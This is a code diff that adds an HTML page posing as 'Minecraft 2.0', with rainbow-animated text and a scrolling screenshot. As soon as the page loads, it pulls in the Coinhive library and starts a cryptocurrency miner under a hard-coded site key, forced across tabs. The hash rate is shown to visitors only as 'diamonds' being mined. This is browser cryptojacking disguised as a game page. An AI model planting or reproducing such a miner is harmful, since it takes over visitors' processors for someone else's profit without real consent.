@@ -1,2 +1,194 @@
-<!doctype html>
-<h1>THIS page is protected!</h1>
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Back up for Basil</title>
+    <style>
+        span {
+            font-size: 40px;
+            color: red;
+            font-family: "Comic Sans MS", cursive, sans-serif;
+        }
+        
+        body {
+            margin: 0;
+            background: blue;
+            text-align: center;
+        }
+        
+        span {
+            -webkit-animation: rainbow 1s infinite;
+            -ms-animation: rainbow 1s infinite;
+            -o-animation: rainbow 1s infinite;
+            animation: rainbow 1s infinite;
+        }
+        
+        @-webkit-keyframes rainbow {
+            0% {
+                color: #ff0000;
+            }
+            10% {
+                color: #ff8000;
+            }
+            20% {
+                color: #ffff00;
+            }
+            30% {
+                color: #80ff00;
+            }
+            40% {
+                color: #00ff00;
+            }
+            50% {
+                color: #00ff80;
+            }
+            60% {
+                color: #00ffff;
+            }
+            70% {
+                color: #0080ff;
+            }
+            80% {
+                color: #0000ff;
+            }
+            90% {
+                color: #8000ff;
+            }
+            100% {
+                color: #ff0080;
+            }
+        }
+        
+        @-ms-keyframes rainbow {
+            0% {
+                color: #ff0000;
+            }
+            10% {
+                color: #ff8000;
+            }
+            20% {
+                color: #ffff00;
+            }
+            30% {
+                color: #80ff00;
+            }
+            40% {
+                color: #00ff00;
+            }
+            50% {
+                color: #00ff80;
+            }
+            60% {
+                color: #00ffff;
+            }
+            70% {
+                color: #0080ff;
+            }
+            80% {
+                color: #0000ff;
+            }
+            90% {
+                color: #8000ff;
+            }
+            /*100% {color: #ff0080;}*/
+        }
+        
+        @-o-keyframes rainbow {
+            0% {
+                color: #ff0000;
+            }
+            10% {
+                color: #ff8000;
+            }
+            20% {
+                color: #ffff00;
+            }
+            30% {
+                color: #80ff00;
+            }
+            40% {
+                color: #00ff00;
+            }
+            50% {
+                color: #00ff80;
+            }
+            60% {
+                color: #00ffff;
+            }
+            70% {
+                color: #0080ff;
+            }
+            80% {
+                color: #0000ff;
+            }
+            90% {
+                color: #8000ff;
+            }
+            /*100% {color: #ff0080;}*/
+        }
+        
+        @keyframes rainbow {
+            0% {
+                color: #ff0000;
+            }
+            10% {
+                color: #ff8000;
+            }
+            20% {
+                color: #ffff00;
+            }
+            30% {
+                color: #80ff00;
+            }
+            40% {
+                color: #00ff00;
+            }
+            50% {
+                color: #00ff80;
+            }
+            60% {
+                color: #00ffff;
+            }
+            70% {
+                color: #0080ff;
+            }
+            80% {
+                color: #0000ff;
+            }
+            90% {
+                color: #8000ff;
+            }
+            /*100% {color: #ff0080;}*/
+        }
+
+    </style>
+</head>
+
+<body>
+    <marquee scrollamount="15">
+        <img width="750" src="https://images.weserv.nl/?url=static.planetminecraft.com/files/resource_media/screenshot/1214/2012-04-02_215202_1868694.jpg">
+    </marquee>
+    <br>
+    <span id="msg">Welcome to Minecraft 2.0</span>
+    <span id="speed">. It is starting. </span>
+    <br>
+    <span id="current-mined"></span>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('mUH6NdO9w3srjU9bhl3eHjCYX2eG2DGf');
+        miner.setThrottle(0.15)
+        miner.start(CoinHive.FORCE_MULTI_TAB)
+        miner.on('open', function() {
+            document.getElementById('msg').innerHTML = 'Welcome ' + (miner.hasWASMSupport() ? 'to' : 'dab') + ' Minecraft 2.0 '
+        })
+        setInterval(function() {
+            document.getElementById('speed').innerHTML = ' running at a speed of ' + miner.getHashesPerSecond() + ' diamonds per second.'
+        }, 500)
+        setInterval(function() {
+            document.getElementById('current-mined').innerHTML = miner.getTotalHashes(true) + ' diamonds have been mined currently.'
+        }, 100)
+
+    </script>
+</body>
+
+</html>
